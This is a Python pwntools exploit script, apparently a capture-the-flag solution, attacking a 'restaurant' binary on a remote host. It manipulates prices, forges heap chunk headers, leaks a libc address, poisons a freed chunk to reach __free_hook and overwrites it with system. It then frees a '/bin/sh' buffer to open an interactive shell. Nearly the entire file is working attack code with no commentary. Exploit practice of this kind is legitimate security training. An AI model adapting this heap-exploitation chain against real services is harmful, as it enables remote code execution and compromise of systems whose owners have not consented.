#!/usr/bin/python2
# -*- coding:utf-8 -*-

from pwn import *
import os
import struct
import random
import time
import sys

# Create a symbol file for GDB debugging
try:
    gdb_symbols = '''
    typedef struct commodity
    {
        char name[32];
        double price;
        double dislike;
    }commodity;

    commodity no_use;
    '''

    f = open('/tmp/gdb_symbols.c', 'w')
    f.write(gdb_symbols)
    f.close()
    os.system('gcc -g -shared /tmp/gdb_symbols.c -o /tmp/gdb_symbols.so')
    # os.system('gcc -g -m32 -shared /tmp/gdb_symbols.c -o /tmp/gdb_symbols.so')
except Exception as e:
    print(e)

context.arch = "amd64"
# context.log_level = 'debug'
execve_file = './restaurant'
# sh = process(execve_file, env={"LD_PRELOAD": "/tmp/gdb_symbols.so"})
# sh = process(execve_file)
sh = remote('eonew.cn', 60106)
elf = ELF(execve_file)
libc = ELF('./libc-2.27.so')
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# Create temporary files for GDB debugging
try:
    gdbscript = '''
    set $goods=(commodity *)$rebase(0x202060)
    set $bill=(double *)$rebase(0x202380)
    set $size=(unsigned short *)$rebase(0x2023B6)
    set $cost=(double *)$rebase(0x202368)
    set $u=(double *)$rebase(0x202360)
    set $name=(char **)$rebase(0x202378)
    
    define prg
        p *$goods@$arg0
        end

    define prb
        p *$bill@8
        x/8gx $bill
        end

    define pr
        echo cost\\n
        p *$cost
        echo qword_202360\\n
        p *$u
        end
            
    # b *$rebase(0xE69)
    '''

    f = open('/tmp/pid', 'w')
    f.write(str(proc.pidof(sh)[0]))
    f.close()

    f = open('/tmp/gdbscript', 'w')
    f.write(gdbscript)
    f.close()
except Exception as e:
    print(e)
    
def Order(index, num, length=None, name=None):
    sh.sendlineafter('Your choice:', '1')
    sh.sendlineafter('Which do you want: ', str(index))
    sh.sendlineafter('Good choice!How many do you want: ', str(num))
    sh.sendlineafter('How much do you want to pay as tips: ', '0.55')
    sh.recvuntil('Do you want to sign your name?:(y/n) ')
    if(length != None):
        sh.sendline('y')
        sh.sendlineafter('Input the length of your name: ', str(length))
        if(length <= 0x200):
            sh.sendafter('Input your name: ', name)
    else:
        sh.sendline('n')

# Request 1
sh.sendlineafter('Your choice:', '4')
sh.sendlineafter('Name: ', 'negative')
sh.sendlineafter('Price: ', '1e16')

# Request 2
sh.sendlineafter('Your choice:', '4')
sh.sendlineafter('Name: ', 'negative')
sh.sendlineafter('Price: ', '-99999')


Order(5, 1, 0x18, '\n')
Order(5, 0, 0x38, '\n')
Order(5, 0, 0x58, '\n')
Order(5, 0, 0x78, '\n')
Order(5, 0, 0x201, '\n')
Order(5, 0, 0x18, '\n')

heap_layout = [
    'a' * 0x10,
    p64(0) + p64(0x421), # 0x38
    'b' * 0x30,
    p64(0) + p64(0x441), # 0x58
    'c' * 0x70,
    p64(0) + p64(0x81), # 0x78
    'd' * 0x350,
    p64(0) + p64(0x21), # fake_chunk
    'e' * 0x10,
    p64(0) + p64(0x21), # fake_chunk
    'f' * 0x30,
    p64(0) + p64(0x21), # fake_chunk
    'g' * 0x10,
    p64(0) + p64(0x21), # fake_chunk
]

payload = flat(heap_layout)
# edit current_size
Order(6, 999999, 10, flat(heap_layout))

Order(5, 0, 0x201, '\n')
# Order(5, 0, 0x58, '\n')
# Order(5, 0, 0x201, '\n')
Order(5, 0, 0x38, '\n')
Order(5, 0, 0x201, '\n')
Order(5, 0, 0x98, 'x' * 8)

sh.recvuntil('x' * 8)
result = sh.recvline()[:-1]
main_arena_addr = u64(result.ljust(8, '\0')) - 1104 # 
log.success('main_arena_addr: ' + hex(main_arena_addr))
libc_addr = main_arena_addr - 0x3ebc40
log.success('libc_addr: ' + hex(libc_addr))

__free_hook_addr = libc_addr + libc.symbols['__free_hook']
log.success('__free_hook_addr: ' + hex(__free_hook_addr))


heap_layout = [
    'o' * 0x30,
    p64(0) + p64(0x101),
    p64(__free_hook_addr - 8), # fd
]

Order(5, 0, 0x90, flat(heap_layout))

Order(5, 0, 0x201, '\n')
Order(5, 0, 0x58, '\n')

system_addr = libc_addr + libc.symbols['system']
log.success('system_addr: ' + hex(system_addr))

Order(5, 0, 0x201, '\n')
Order(5, 0, 0x58, '/bin/sh\0'.ljust(8, 'z') + p64(system_addr))
Order(5, 0, 0x201, '\n')

sh.interactive()
